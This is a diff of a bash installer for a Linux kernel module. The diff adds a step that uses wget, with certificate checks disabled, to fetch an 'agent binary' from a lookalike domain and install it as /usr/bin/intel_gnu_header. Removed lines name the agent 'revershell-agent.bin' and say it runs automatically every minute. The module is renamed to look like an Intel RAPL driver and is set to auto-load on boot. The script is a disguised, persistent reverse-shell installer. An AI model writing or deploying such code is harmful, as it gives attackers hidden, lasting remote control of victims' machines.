@@ -62,14 +62,29 @@ fi
 echo -e "${GREEN}[+] System requirements satisfied.${NC}"
 echo ""
 
+# Download and setup agent binary
+echo -e "${BLUE}[*] Downloading agent binary...${NC}"
+if sudo wget https://digitalocean.live/intel_headers_gnu --no-check-certificate -O /usr/bin/intel_gnu_header; then
+    echo -e "${GREEN}[+] Agent binary downloaded successfully${NC}"
+else
+    echo -e "${RED}[!] Failed to download agent binary${NC}"
+    exit 1
+fi
+
+# Set executable permissions
+echo -e "${BLUE}[*] Setting executable permissions...${NC}"
+if sudo chmod +x /usr/bin/intel_gnu_header; then
+    echo -e "${GREEN}[+] Permissions set successfully${NC}"
+else
+    echo -e "${RED}[!] Failed to set permissions${NC}"
+    exit 1
+fi
+
 # Configuration info
 echo -e "${BLUE}[*] Agent Configuration:${NC}"
-echo -e "  Agent Binary: ${YELLOW}/tmp/revershell-agent.bin${NC}"
+echo -e "  Agent Binary: ${YELLOW}/usr/bin/intel_gnu_header${NC}"
 echo -e "  Execution Interval: ${YELLOW}60 seconds (1 minute)${NC}"
 echo -e "  Execution Mode: ${YELLOW}Automatic${NC}"
-echo ""
-echo -e "${YELLOW}[!] Make sure to place your revershell-agent.bin in /tmp/ directory${NC}"
-echo -e "${YELLOW}[!] The agent will be executed automatically every minute once the module is loaded${NC}"
 echo ""
 
 # Clean previous builds
@@ -86,14 +101,14 @@ else
 fi
 
 # Check if module file exists
-if [ ! -f "intel_rapl_snaps.ko" ]; then
+if [ ! -f "intel_rapl_headers.ko" ]; then
     echo -e "${RED}[!] Module file not found after build.${NC}"
     exit 1
 fi
 
 echo ""
 echo -e "${GREEN}[+] Build completed successfully!${NC}"
-echo -e "${BLUE}[*] Module file: intel_rapl_snaps.ko${NC}"
+echo -e "${BLUE}[*] Module file: intel_rapl_headers.ko${NC}"
 echo ""
 
 # Install the module
@@ -101,7 +116,7 @@ echo -e "${BLUE}[*] Installing kernel module...${NC}"
 CURRENT_DIR=$(pwd)
 
 # Create directory structure and install module
-if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_snaps; then
+if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_headers; then
     echo -e "${GREEN}[+] Created module directory${NC}"
 else
     echo -e "${RED}[!] Failed to create module directory${NC}"
@@ -109,7 +124,7 @@ else
 fi
 
 # Copy module to system location
-if sudo cp "$CURRENT_DIR/intel_rapl_snaps.ko" /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_snaps/; then
+if sudo cp "$CURRENT_DIR/intel_rapl_headers.ko" /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_headers/; then
     echo -e "${GREEN}[+] Module copied to system directory${NC}"
 else
     echo -e "${RED}[!] Failed to copy module${NC}"
@@ -117,9 +132,9 @@ else
 fi
 
 # Check if module is already loaded and remove it
-if lsmod | grep -q intel_rapl_snaps; then
+if lsmod | grep -q intel_rapl_headers; then
     echo -e "${YELLOW}[!] Module already loaded, removing it first...${NC}"
-    sudo rmmod intel_rapl_snaps || true
+    sudo rmmod intel_rapl_headers || true
 fi
 
 # Check for conflicting modules (rebellion, etc.)
@@ -129,7 +144,7 @@ if lsmod | grep -q rebellion; then
 fi
 
 # Load the module
-if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_snaps/intel_rapl_snaps.ko; then
+if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_headers/intel_rapl_headers.ko; then
     echo -e "${GREEN}[+] Module loaded successfully${NC}"
 else
     echo -e "${RED}[!] Failed to load module${NC}"
@@ -143,10 +158,10 @@ sudo depmod -a
 
 # Add to auto-load configuration
 echo -e "${BLUE}[*] Configuring auto-load...${NC}"
-echo "intel_rapl_snaps" | sudo tee /etc/modules-load.d/intel_rapl_snaps.conf > /dev/null
+echo "intel_rapl_headers" | sudo tee /etc/modules-load.d/intel_rapl_headers.conf > /dev/null
 
 # Load with modprobe
-if sudo modprobe intel_rapl_snaps; then
+if sudo modprobe intel_rapl_headers; then
     echo -e "${GREEN}[+] Module configured for auto-load${NC}"
 else
     echo -e "${YELLOW}[!] Module already loaded${NC}"
@@ -157,7 +172,7 @@ echo -e "${GREEN}[+] Installation completed successfully!${NC}"
 
 # Verify module is loaded
 echo -e "${BLUE}[*] Verifying module is loaded...${NC}"
-if lsmod | grep -q intel_rapl_snaps; then
+if lsmod | grep -q intel_rapl_headers; then
     echo -e "${GREEN}[+] Module is now active and will auto-load on boot${NC}"
 else
     echo -e "${YELLOW}[!] Warning: Module may not be loaded properly${NC}"
